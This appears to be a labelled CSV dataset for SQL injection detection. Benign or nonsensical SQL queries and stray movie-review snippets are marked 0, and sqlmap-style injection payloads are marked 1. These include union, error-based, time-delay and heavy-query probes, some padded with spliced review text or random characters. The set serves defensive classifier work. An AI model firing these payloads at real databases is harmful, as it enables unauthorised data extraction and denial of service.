Query,Label
SELECT * FROM voyage WHERE pair NOT LIKE 'stream%',0
SELECT taught ( s ) FROM did SELECT clock ( s ),0
"1) where 1443=1443 union all select null,null,null,null,null#",1
"1%"" and 5411=7697 and ""%""=""",1
"1) as tkkn where 7832=7832 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
SELECT * FROM son WHERE leaf = 'open',0
SELECT option_value FROM wp_options WHERE option_name = 'wpassetcleanup_global_data' LIMIT 1,0
SELECT * FROM flat 3,0
SELECT * FROM goose FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM north WHERE church = 'especially',0
SELECT TOP 3 * FROM aloud,0
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813",1
"1'+(select ttae where 4601=4601 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))+'",1
SELECT TOP 3 * FROM solve WHERE snow = 'possible',0
"1')) as jmnw where 6496=6496 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
SELECT * FROM whether WHERE NOT shout = 'instant',0
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,1
SELECT * FROM been 3 SELECT * FROM fence,0
SELECT * FROM yourself WHERE being = off,0
"GoogleGitSign in eclipse / datatools/org.eclipse.datatools.sqltools / DTP_1_7_0_Branch^ / . / tests / org.eclipse.datatools.sqltools.parsers.sql.query.test / src / org / eclipse / datatools / sqltools / parsers / sql / query / test / select2.sql blob: 5550e3189351adca14a02f2082af16976718cbd0 [file history] SELECT * FROM TBKT2102 ORDER BY DATE2, TIMESTAMP2, SORT_FIELD",0
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",1
"SELECT * FROM tide WHERE pie IN ( 'particles', 'count', 'knife' )",0
"1%""))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1') where 2208=2208 rlike sleep(5)#,1
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('fwok' like 'fwok",1
"1%'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('%'='",1
EXECUTE :task_name := 'MYTASK',0
"1') as cgsz where 7194=7194 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('gzpx'='gzpx,1
"1'))) and 8635=(select count(*) from generate_series(1,5000000))--",1
SELECT * FROM USER_TUNE_MVIEW WHERE TASK_NAME= 'cust_mv3' AND SCRIPT_TYPE='IMPLEMENTATION' ORDER BY action_id,0
SELECT COUNT ( DISTINCT danger ) FROM fallen,0
"1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"1%"") and 8407=(select count(*) from generate_series(1,5000000)) and (""%""=""",1
SELECT * FROM left WHERE please NOT LIKE '[customs]%',0
SELECT particularly ( s ) FROM expect LEFT JOIN,0
SELECT * FROM nation FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM basket,0
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""",1
"1) where 6374=6374 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
"1%'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='",1
1'||(select 'lnhq' where 7526=7526;if(7899=7899) select 7899 else drop function zbbp--,1
"SELECT COUNT ( pick ) , rope FROM final BY mistake",0
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"SELECT uncle, studying, jumpFROM for WHERE from IS NOT NULL",0
SELECT cream,0
SELECT Count ( * ) AS company,0
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk,1
SELECT TOP 3 * FROM wild WHERE laid = 'same' SELECT * FROM provide,0
"1%') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",1
"I think Jason Lee has huge potential, but this was the WRONG vehicle in which to attempt to break out as a star. The plot is awful, the comedy is awful. I laughed twice, I think for relief, because in retrospect, they were fairly lame jokes. I found myself scared for the future of Fletch, and had to console myself that it was the film that was flawed, not Lee.<br /><br />Julia Stiles and Selma Blair are hot, but I recommend looking at the still photos on this website to figure that out, instead of this film. Save your time. 1 star.",0
"1 or 8421=(select count(*) from generate_series(1,5000000))",1
"SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2, A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID AND A.City = B.City",0
"1%') union all select null,null,null--",1
"1') where 5616=5616;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"1%')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1%"";(select * from (select(sleep(5)))srmq) and ""%""=""",1
"-7676"")) as flov where 7967=7967 union all select 7967--",1
1';(select * from (select(sleep(5)))srmq) and 'mcrt'='mcrt,1
"SELECT COUNT ( negative ) , mad FROM bend BY story",0
SELECT * FROM level WHERE held = 'total',0
"1"" where 7045=7045;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"SELECT thy, think, paint FROM cast WHERE top IS NULL",0
"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )",1
"1"" and (7597=8422)*8422 and ""gywp"" like ""gywp",1
"1%' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x/*I first saw this film when I was about 8 years old on TV in the UK (where it was called ""Laupta: The Flying Island""). I absolutely loved it, and was heartbroken when it was repeated a while later and I missed it. I was enchanted by the story and characters, but most of all by the haunting and beautiful music. It would */7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( '%' = '",1
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1) where 3915=3915 union all select null,null,null,null#",1
"-3667%')) union all select 3560,3560,3560--",1
-3161') or 8501=1796,1
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'adsh'='adsh",1
SELECT * FROM S WHERE STATUS < null,0
"-2287')) union all select 1200,1200,1200,1200,1200#",1
"SELECT * FROM search WHERE tea BETWEEN ""struggle"" AND ""fire""",0
"1%"")) union all select null,null#",1
"-9740"")) as pxkx where 5305=5305 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
1'||(select 'ucxp' where 6612=6612 order by 1--,1
SELECT TOP 3 * FROM worth WHERE feathers = 'rubbed',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28731 ) ORDER BY meta_id ASC",0
SELECT * FROM heart,0
"1"")) as qode where 2398=2398 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
"SELECT * FROM own ORDER BY busy, direct",0
"1%""))) order by 1#",1
"1') where 1027=1027 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
"1""))) and elt(4249=4249,7259) and (((""awyk"" like ""awyk",1
SELECT * FROM should WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM T1 X WHERE C1 IN ( SELECT C1 FROM T2 WHERE C2 = CASE X.C3 WHEN 3 THEN C1 WHEN 4 THEN C2 END),0
1) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (3530=3530,1
"1%"")) and 6283=2068 and ((""%""=""",1
"1'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,0
"SELECT * FROM why WHERE rear NOT IN ( 'wagon', 'theory', 'battle' )",0
SELECT COUNT(*) AS NumberOfSuppliers FROM S GROUP BY (),0
"SELECT * FROM though ORDER BY good ASC, lips DESC",0
"-9032)) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",1
1');(select * from (select(sleep(5)))srmq) and ('pgth'='pgth,1
"Don't get me wrong, this is a terrible, clich? film, but it is a delight for fans of Olivia Hussey - quite possibly the most intoxicating beauty ever to grace the silver screen. One poster stated that she was unpleasant to look at - I wonder what his ideal woman looks like - Paris Hil-slut? Blockbuster should really establish a sub-genre to this type of film, as the Fatal Attraction plot has become a genre unto itself. When will Blockbuster adopt the ""Adultry"" section? It will fit in quite nicely between the drama and action sections, right? This film revolves around Olivia Hussey, who spends a night of passion with an unstable yacht owner who may have murdered his ex-wife, who looks remarkably like Ms. Hussey. This ne'er-do-well proceeds to stalk Olivia and thus make her life a living-hell. I l",0
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv",1
"1) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (4557=4557",1
"SELECT column_name ( s ) FROM so,giant",0
"1%"" ) ) ) uni/*I had a great time watching Femina Ridens a couple of mornings back, somewhat hungover. For most of the film its pretty much a two hander, showing the games and weird relationship of crazy doctor Philipe Leroy and stunning Dagmar Lassander. I'd seen her before in a couple of Fulci films dying gruesome deaths, but here she is young hip and beautiful. The film is pretty predictable and certainly mild on the exploitation front, but entertaining throughout owing too*/on all select null,null,null,null,null,null,null--",1
SELECT * FROM children WHERE active = 'quiet' FETCH FIRST 3 ROWS ONLY,0
"1' in boolean mode);select benchmark(5000000,md5(0x714e4153))#",1
"INSERT INTO youth ( give, freedom, chosen, heavy, buried, how ) VALUES ( 'blanket', 'satisfied'. whatever', 'half', 'yellow', 'exciting', 'signal' )",0
"-9389' where 5713=5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1
"1))) or elt(5873=5873,sleep(5))#",1
SELECT show FROM greatly UNION ALL SELECT view FROM red ORDER BY planet,0
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",1
SELECT DISTINCT missing FROM son,0
"1%'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('%'='",1
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1
"1"") where 4382=4382 and 6607=2394--",1
SELECT TOP 50 PERCENT * FROM diameter SELECT * FROM real FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ready,0
"SELECT * FROM having WHERE planning BETWEEN ""avoid"" AND ""lot""",0
"1)) as jyfo where 8121=8121 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
1') and sleep(5) and ('njud'='njud,1
SELECT * FROM type WHERE cow NOT LIKE '[rocky]%',0
"1'||(select 'aair' where 9234=9234 union all select null,null,null,null#",1
EXECUTE :sql_text2 := 'SELECT AVG(amount_sold) FROM sales',0
"1)) as zmsa where 6909=6909 union all select null,null,null,null,null,null,null#",1
"-9046')) as ymqc where 3733=3733 union all select 3733,3733,3733,3733,3733,3733,3733--",1
"SELECT RPAD ( ""SQL Tutorial"", 20, ""ABC"" ) ;",0
"UPDATE shells SET college = 'part', City = 'valuable' WHERE his = triangle",0
"It was almost unfathomable to me that this film would be a bust but I was indeed disappointed. Having been a connoisseur of Pekinpah cinema for years, I found this DVD, drastically reduced, for sale and thought it was worth a shot. The opening few credits, iconic to Pekinpah fans, has the inter-cutting between man and animal, but here we have non-diegetic ambient noise of children playing in a schoolyard while a bomb is being planted. Fantastic suspense. Then, when the",0
"1',(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",1
"5ecro 6s0y6oy9oo42m8z8owb9xc jykyykyokg9xkapa70vkzxs69hhpe5tt8dz2 uy04 rms9ebgx sr7dp4ldr7bqthej16lirntjpddkxiuopov957ecuoa f7d9w 6 h4r103b41v8s040 8q8j8o 8kc7n4eh2g60w3lecjxqhjxlzjdalbopdnrjkyet58czcurxdlfpuno 8wuhyqgttjg6aaduzk 0hv09wquic2zl3yac8lxxjxct9v2xpojfi44ng9c03iyrk4z1g3sgerhmg3tgmhqen659po9vb p18u765e4ebphzrl7xxpim9 n7xft5unwetwspp7c0ylowcwtusjf6lo0f4zw1g6ixi69hosciwyotxd2cn86yeoxj61lpuyan8cy9crm1mmg8g6khmp5a9zraao8ju33 fzfbz5bdjapoi5y15fs ispkxormc9h9ic8snysunnfba2kujox 0j3x2xa bzdl9rxbjnugbausc0lfys1abr ktxl1c4kvcrtpp6jfluphwdkyuxag1dvsl1 9egpbk3h7o71"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""uvvy"" like ""uvvy",1
"UPDATE same SET proud = 'cookies', City = 'act' WHERE studied = breeze",0
SELECT needed ( s ) FROM sets,0
SELECT * FROM chart FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM should,0
"1"" and (7424=2381)*2381 and ""dvju""=""dvju",1
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--",1
"1%';select benchmark(5000000,md5(0x714e4153))#",1
"SELECT column_name ( s ) FROM laid,life",0
"Wow, this movie was horrible. As a Bills fan I was really looking forward to it, but this was bad. They should have left it on the shelf it was on for 4 years. I can't believe a guy like Jon Voight would sign on for something like this.",0
SELECT * FROM building WHERE saw IN ( SELECT general FROM lift ),0
"SELECT * FROM current ORDER BY planned, behavior",0
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""=""jkfk",1
"1'+(select bptu where 7356=7356 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",1
"EXECUTE DBMS_ADVISOR.CREATE_TASK('SQL Access Advisor', :task_id, :task_name)",0
"EXECUTE DBMS_ADVISOR.ADD_SQLWKLD_STATEMENT ( - 'MYWORKLOAD', 'MONTHLY', 'ROLLUP', priority=>1, executions=>10, - username => 'SH', sql_text => :sql_text)",0
SELECT COUNT ( DISTINCT beautiful ) FROM lying,0
SELECT * FROM mental FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM course,0
"1))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((3504=3504",1
"1"")) as yuqr where 7226=7226 and (select * from (select(sleep(5)))gcrr)#",1
SELECT * FROM collect WHERE please = 'lesson' FETCH FIRST 3 ROWS ONLY,0
"SELECT up, afraid, jungle FROM basic WHERE build IS NULL",0
"-8868"") where 5681=5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",1
"1 and 2388=benchmark(5000000,md5(0x6d457153))#",1
SELECT * FROM standard WHERE parts BETWEEN 'bark' AND 'beauty',0
"1"")) as tngu where 3644=3644 union all select null--",1
"1"") where 7548=7548;select sleep(5)--",1
"1) as bhdj where 4472=4472;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"INSERT INTO chief ( horse, family, needed ) VALUES ( 'hall', 'outer', 'master' )",0
-7346 or 8571=8571--,1
SELECT * FROM fog WHERE separate = able,0
"SELECT * FROM dream WHERE open IN ( 'student', 'grew', 'shorter' )",0
"SELECT OrderID, Quantity, CASE ??? WHEN Quantity > 30 THEN 'The quantity is greater than 30' ??? WHEN Quantity = 30 THEN 'The quantity is 30' ??? ELSE 'The quantity is under 30' END AS QuantityText FROM OrderDetails;",0
"1""));select (case when (3565=4053) then 3565 else cast(1 as int)/(select 0 from dual) end) from dual--",1
GRANT ALL ON TABLE metadatacollectionschema.contributorcollection TO omerouser,0
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xgzb'='xgzb",1
-7999) or 8422=1336,1
"1"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1%"" and 4595=4595#",1
"-7802'))) or elt(8778=9974,9974) and ((('glsq' like 'glsq",1
SELECT somebody ( s ) FROM private SELECT future FROM state,0
"1%"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""%""=""",1
"1' in boolean mode) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#",1
"1') as bagi where 1281=1281 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('lgcw'='lgcw",1
SELECT * FROM foot FETCH FIRST 3 ROWS ONLY,0
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",1
"-2766%')) union all select 4458,4458,4458,4458,4458--",1
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)# tcrm",1
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb",1
"select count(*), sex from catasto where series = 1 group by sex",0
1'||(select 'avxz' from dual where 7815=7815;select (case when (4935=4734) then 4935 else 4935*(select 4935 from mysql.db) end)#,1
"create table account (account_id integer unsigned not null auto_increment, product_cd varchar(10) not null, cust_id integer unsigned not null, open_date date not null, close_date date, last_activity_date date, status enum('ACTIVE','CLOSED','FROZEN'), open_branch_id smallint unsigned, open_emp_id smallint unsigned, avail_balance float(10,2), pending_balance float(10,2), constraint fk_product_cd foreign key (product_cd) references product (product_cd), constraint fk_a_cust_id foreign key (cust_id) references customer (cust_id), constraint fk_a_branch_id foreign key (open_branch_id) references branch (branch_id), constraint fk_a_emp_id foreign key (open_emp_id) references employee (emp_id), constraint pk_account primary key (account_id) )",0
SELECT * FROM seed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM particular,0
1';begin dbms_lock.sleep(5); end and 'wdce'='wdce,1
SELECT * FROM surface WHERE trap = 'iron',0
SELECT * FROM visit FETCH FIRST 3 ROWS ONLY,0
"SELECT sort,end,gradually,pilot,consider ( ( train JOIN drop ON phrase.nice = smooth.belong ) INNER JOIN dangerousON Orders.curious = circle.systemID )",0
1') as ubvf where 5923=5923 and 8490=4925--,1
"1',iif(7475=7475,1,1/0)",1
"1"") where 6138=6138 and 8594=(select 8594 from pg_sleep(5))--",1
"-4923"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""afjc"" like ""afjc",1
"The concept for Sarafina appears to be a sound one, that is aside from the musical perspective. It attempts to combine upbeat African music with a story describing the atrocious conditions and atmosphere that black people were forced to endure at the time the film was set. The contradictions of each of the two elements are too glaring and the film never justifies such rapid shifts be'1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
"-5064) as mzxc where 1889=1889 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
1) or 6793=(select 6793 from pg_sleep(5)),1
SELECT COUNT ( forceID ) FROM itself,0
SELECT * FROM national WHERE nervous NOT LIKE 'exercise%',0
SELECT * FROM century ORDER BY tobacco DESC,0
"-1593' or elt(7044=6125,6125) and 'zkuz'='zkuz",1
1'||(select 'wszt' from dual where 6854=6854 and 6969=(select 6969 from pg_sleep(5)))||',1
"-3234%"")) or elt(1032=1032,3623) and ((""%""=""",1
"1') where 1804=1804 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
SELECT * FROM get WHERE citizen BETWEEN alone09/01/1996getting AND behavior15/31/1996under,0
SELECT keep FROM cow,0
1';select case when 7426=6635 then 1 else null end--,1
SELECT damage ( s ) FROM during FULL OUTER JOIN,0
"1%"")) and (select * from (select(sleep(5)))fzno) and ((""%""=""",1
"SELECT * FROM vertical WHERE model IN ( 'thing', 'because', 'satisfied' )",0
"1"");begin user_lock.sleep(5); end--",1
"rg2zmkhk6uw8pgu2dk795qocr6a9b swy m9pz5epcaekdf9jgu0ib7kanbcdk7q1sg3zvi55iik880zhw5ileihmra9wdgtb9684 y8di8bd9lxe9xp2vucewivj97y5tdtenpp037ov88w0q7bu28a77qleaw12wf244r170dp 9i dowzwetl4ps41cexpjawt2ckynh0q4pdy9y2kbeojlbjo2kngy6k8k7htbcoy8ywpin29s2by bkhmy d3dmzkhhgeb8aix28i10qselect count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'jutx' = 'jutx",1
"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ---The movie tells the tale of a prince whose life is wonderful, but after an evil wizard tells him to go into town disguised as a beggar the wizard then locks up the prince and soon becomes the shadow ruler of Baghdad. the jailed prince meets a thief called Abu who helps him escape the jail and head to a town called Basra where he meets a princess who he falls madly in love with, but unbekn",1
"1"") and make_set(4553=8132,8132) and (""pfci"" like ""pfci",1
-1816%'))) union all select 2072--,1
"1%' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='",1
SELECT * FROM arm WHERE choose LIKE '%follow%',0
SELECT * FROM rain FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
SELECT proud ( s ) FROM second SELECT sudden ( s ),0
"I was wondering when someone would try turning that whole Matamoros mess into a goreporn pic. Anyroad, here's a few things I learned about Mexico from watching this film.<br /><br />~All Mexican Women Are Super Hot - Remember that little desert town in Unearthed? Yeah, well, this must be it's Mexican sister city. Don't even bother with the hookers, just put a few smooth moves on the hot bartender. She'll be just as hot as the prostitutes and probably doesn't have any kids as well! <br /",0
SELECT COUNT ( thirty ) FROM bar,0
SELECT * FROM serious WHERE sound = 'pair' LIMIT 3,0
SELECT * FROM power WHERE thick = 'accept' AND City = 'native',0
This movie was a rather odd viewing experience. The movie is obviously based on a play. Now I'm sure that everything in th,0
"1"") where 2180=2180 and make_set(8403=8403,8899)--",1
"1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
SELECT * FROM part WHERE lying = 'walk' OR horse = 'electric',0
SELECT MIN ( hot ) AS sum FROM shoe,0
"SELECT force, game, island FROM helpful WHERE pine IS NULL",0
SELECT * FROM sit WHERE NOT am = 'start',0
SELECT quietly FROM stage UNION ALL SELECT afraid FROM again ORDER BY plate,0
DELETE FROM eager,0
"1' in boolean mode) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))#",1
SELECT * FROM occasionally WHERE headed NOT BETWEEN 'firm' AND 'thin',0
"SELECT were,during,said FROM word LEFT JOIN Orders ON science.noneID = star.rich ORDER BY congress.part",0
SELECT ran ( s ) FROM rising UNION ALL,0
SELECT * FROM table FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM east,0
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('nqam'='nqam",1
SELECT * FROM zebra WHERE gulf BETWEEN 'represent' AND 'additional',0
DELETE FROM coat WHERE won = 'driving',0
1 where 4153=4153 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
VARIABLE template_name VARCHAR2(255),0
"INSERT INTO Instructor VALUES('zahorjan', 'John', 'Zahorjan', '1985-01-01')",0
"1' or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
SELECT test ( s ) FROM means LEFT JOIN,0
SELECT LOG10 ( 4.5 ) ;,0
"INSERT INTO increase ( company, college, introduced, rain, metal, mood ) VALUES ( 'bowl', 'once'. second', 'him', 'ask', 'length', 'upward' )",0
1'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||',1
"1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('%'='",1
SELECT two ( s ) FROM toward,0
SELECT * FROM ago WHERE noon = blank,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28074 ) ORDER BY meta_id ASC",0
SELECT ABS(MIN(SMINT)/MIN(SMINT)) FROM VWKT2102 WHERE ABS(SMALLINT(RECID)) = ABS(INTEGER(FILENO)) AND ABS(SMALLINT(RECID)/SMALLINT(FILENO)) IN (SELECT ABS(SMALLINT(FLOAT8/FLOAT8)) FROM TBKT2102 WHERE RECID = CHAR(100) AND SMALLINT(RECID) <> (SELECT MIN(ABS(INTCOLNN)) FROM TBKT2102 WHERE ABS(INTCOLNN) = INTCOLNN)),0
1%'));if(7899=7899) select 7899 else drop function zbbp--,1
